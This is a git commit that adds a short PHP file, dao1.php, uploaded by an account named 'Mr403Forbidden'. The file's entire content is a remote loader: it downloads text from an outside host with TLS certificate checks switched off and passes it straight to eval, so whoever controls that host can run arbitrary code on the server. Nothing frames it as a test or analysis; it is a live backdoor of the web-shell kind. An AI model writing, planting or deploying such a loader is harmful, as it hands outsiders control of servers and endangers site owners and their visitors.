8303f121e00c071e23a3bc8c3abb9735badfa0f6
/Mr403Forbidden <mr403forbidden@hotmail.com>
2024-02-21 10:02:28 +0700

    Add files via upload

---
+++ dao1.php
@@ -0,0 +1,16 @@
+<?php 
+function getCurlk2($url)
+{
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, $url);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+  $result = curl_exec($ch);
+  curl_close($ch);
+  return $result;
+}
+
+$str=getCurlk2("http://www.vvvxxxyyy.com/PHP/dao.txt");
+echo eval("?>".(($str)));
+?>
